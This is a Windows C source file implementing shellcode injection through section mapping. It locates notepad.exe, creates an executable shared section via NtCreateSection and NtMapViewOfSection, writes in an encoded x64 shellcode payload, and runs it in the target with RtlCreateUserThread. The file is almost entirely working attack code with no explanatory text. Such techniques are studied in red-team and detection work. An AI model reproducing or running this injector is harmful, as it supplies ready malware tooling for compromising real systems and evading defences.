#include<windows.h>
#include<stdlib.h>
#include<tlhelp32.h>
#include<stdio.h>
#include<winternl.h>
#define STATUS_SUCCESS 0x00000000

// typedef struct _CLIENT_ID {
// 	HANDLE UniqueProcess;
// 	HANDLE UniqueThread;
// } CLIENT_ID;

typedef enum _SECTION_INHERIT {
	ViewShare = 1,
	ViewUnmap = 2
} SECTION_INHERIT, *PSECTION_INHERIT;


DWORD ProcessLookup(LPCSTR processName);
void print_error(char *message);
BOOL InjectView(HANDLE hRemoteProcess, unsigned char *payload, LARGE_INTEGER payload_size);

typedef NTSTATUS (NTAPI *NtCreateSection_t) (
	OUT PHANDLE            SectionHandle,
	IN ULONG        DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
	IN PLARGE_INTEGER     MaximumSize OPTIONAL,
	IN ULONG              SectionPageProtection,
	IN ULONG              AllocationAttributes,
	IN HANDLE             FileHandle OPTIONAL
);

typedef NTSTATUS (NTAPI *NtMapViewOfSection_t) (
	HANDLE               SectionHandle,
	HANDLE               ProcessHandle,
	PVOID            *BaseAddress,
	ULONG_PTR                ZeroBits,
	SIZE_T                CommitSize,
	PLARGE_INTEGER   SectionOffset OPTIONAL,
	PSIZE_T           ViewSize,
	DWORD InheritDisposition,
	ULONG                AllocationType OPTIONAL,
	ULONG                Protect
);

typedef NTSTATUS (NTAPI *RtlCreateUserThread_t) (
	HANDLE 		ProcessHandle,
	PSECURITY_DESCRIPTOR SecurityDescriptor,
	BOOLEAN              CreateSuspended,
	ULONG                StackZeroBits,
	PULONG           StackReserved,
	PULONG           StackCommit,
	PVOID                StartAddress,
	PVOID                StartParameter,
	PHANDLE             ThreadHandle,
	CLIENT_ID          *ClientID
);

int main()
{

	// __debugbreak();

	unsigned char payload[] = 	
	"\x48\x31\xc9\x48\x81\xe9\xdb\xff\xff\xff\x48\x8d\x05\xef\xff"
	"\xff\xff\x48\xbb\x24\x42\xb9\xbc\x9f\xae\xdd\x4f\x48\x31\x58"
	"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xd8\x0a\x3a\x58\x6f\x46"
	"\x1d\x4f\x24\x42\xf8\xed\xde\xfe\x8f\x1e\x72\x0a\x88\x6e\xfa"
	"\xe6\x56\x1d\x44\x0a\x32\xee\x87\xe6\x56\x1d\x04\x0a\x32\xce"
	"\xcf\xe6\xd2\xf8\x6e\x08\xf4\x8d\x56\xe6\xec\x8f\x88\x7e\xd8"
	"\xc0\x9d\x82\xfd\x0e\xe5\x8b\xb4\xfd\x9e\x6f\x3f\xa2\x76\x03"
	"\xe8\xf4\x14\xfc\xfd\xc4\x66\x7e\xf1\xbd\x4f\x25\x5d\xc7\x24"
	"\x42\xb9\xf4\x1a\x6e\xa9\x28\x6c\x43\x69\xec\x14\xe6\xc5\x0b"
	"\xaf\x02\x99\xf5\x9e\x7e\x3e\x19\x6c\xbd\x70\xfd\x14\x9a\x55"
	"\x07\x25\x94\xf4\x8d\x56\xe6\xec\x8f\x88\x03\x78\x75\x92\xef"
	"\xdc\x8e\x1c\xa2\xcc\x4d\xd3\xad\x91\x6b\x2c\x07\x80\x6d\xea"
	"\x76\x85\x0b\xaf\x02\x9d\xf5\x9e\x7e\xbb\x0e\xaf\x4e\xf1\xf8"
	"\x14\xee\xc1\x06\x25\x92\xf8\x37\x9b\x26\x95\x4e\xf4\x03\xe1"
	"\xfd\xc7\xf0\x84\x15\x65\x1a\xf8\xe5\xde\xf4\x95\xcc\xc8\x62"
	"\xf8\xee\x60\x4e\x85\x0e\x7d\x18\xf1\x37\x8d\x47\x8a\xb0\xdb"
	"\xbd\xe4\xf4\x25\xaf\xdd\x4f\x24\x42\xb9\xbc\x9f\xe6\x50\xc2"
	"\x25\x43\xb9\xbc\xde\x14\xec\xc4\x4b\xc5\x46\x69\x24\x5e\x68"
	"\xed\x72\x03\x03\x1a\x0a\x13\x40\xb0\xf1\x0a\x3a\x78\xb7\x92"
	"\xdb\x33\x2e\xc2\x42\x5c\xea\xab\x66\x08\x37\x30\xd6\xd6\x9f"
	"\xf7\x9c\xc6\xfe\xbd\x6c\xff\xa5\xf2\x8a\x26\x4a\x26\xd6\xcb"
	"\xec\xf2\x8e\x36\x57\x36\xdc\xd1\xac\x9c\x81\x2c\x45\x2e\xda"
	"\x92\xfa\xd6\xb8\x4f";

	printf("Payload Size : %zd\n", sizeof(payload));

	LARGE_INTEGER payload_size = { sizeof(payload) };

	HANDLE hRemoteProcess = NULL;

	DWORD pID = ProcessLookup("notepad.exe");
	printf("[+] Process ID : %d\n", pID);


	hRemoteProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pID);

	if(!hRemoteProcess) {
		print_error("Using OpenProcess.");
		return -1;
	}

	if(!InjectView(hRemoteProcess, payload, payload_size)) {
		print_error("while injecting payload.");
		return -1;
	}

	return 0;
}

DWORD ProcessLookup(LPCSTR processName) {

	HANDLE hProcessSnap = NULL;
	HANDLE hProcess = NULL;
	PROCESSENTRY32 pe32;
	DWORD dwPriorityClass;

	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if(hProcessSnap == INVALID_HANDLE_VALUE) {
		print_error("taking process snapshot");
		return -1;
	}

	pe32.dwSize = sizeof(PROCESSENTRY32);

	if(!Process32First(hProcessSnap, &pe32)) {
		print_error("getting handle to first process.");
		return -1;
	}

	do {

		if(!lstrcmpiA(pe32.szExeFile, processName)) {
			CloseHandle(hProcessSnap);
			return pe32.th32ProcessID;
		}

	} while(Process32Next(hProcessSnap, &pe32));

	CloseHandle(hProcessSnap);
	return -1;
}

BOOL InjectView(HANDLE hRemoteProcess, unsigned char *payload, LARGE_INTEGER payload_size) {

	HANDLE hSection = NULL;
	PVOID pLocalView = NULL, pRemoteView = NULL;
	HANDLE hThread = NULL;
	CLIENT_ID cid;
	NTSTATUS status;

	NtCreateSection_t pNtCreateSection = (NtCreateSection_t) GetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateSection");

	status = pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, (PLARGE_INTEGER) &payload_size, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

	if(status != STATUS_SUCCESS) {
		print_error("Using NtCreateSection.");
		return FALSE;
	}

	NtMapViewOfSection_t pNtMapViewOfSection = (NtMapViewOfSection_t) GetProcAddress(GetModuleHandle("ntdll.dll"), "NtMapViewOfSection");

	status = pNtMapViewOfSection(hSection, GetCurrentProcess(), (PVOID) &pLocalView, 0, 0, 0, (PSIZE_T) &payload_size, ViewUnmap, 0, PAGE_READWRITE);

	if(status != STATUS_SUCCESS) {
		print_error("Using NtMapViewOfSection.");
		return FALSE;
	}

	RtlMoveMemory(pLocalView, (const void *) payload, strlen(payload));

	status = pNtMapViewOfSection(hSection, hRemoteProcess, (PVOID) &pRemoteView, 0, 0, 0, (PSIZE_T) &payload_size, ViewUnmap, 0, PAGE_EXECUTE_READWRITE);

	if(status != STATUS_SUCCESS) {
		print_error("Using NtMapViewOfSection (Remote).");
		return FALSE;
	}

	printf("[+] Payload : %p\n[+] Local View : %p\n", payload, pLocalView);
	printf("[+] Remote View : %p\n", pRemoteView);

	RtlCreateUserThread_t pRtlCreateUserThread = (RtlCreateUserThread_t) GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlCreateUserThread");

	pRtlCreateUserThread(hRemoteProcess, NULL, FALSE, 0, 0, 0, pRemoteView, 0, &hThread, &cid);

	if(!hThread) {
		print_error("Using RtlCreateUserThread.");
		return FALSE;
	}

	WaitForSingleObject(hThread, 500);
	CloseHandle(hThread);

	return TRUE;
}

void print_error(char * message) {
	printf("[!] Error while %s\n", message);
	printf("[!] Error Code : %d\n", GetLastError());
}


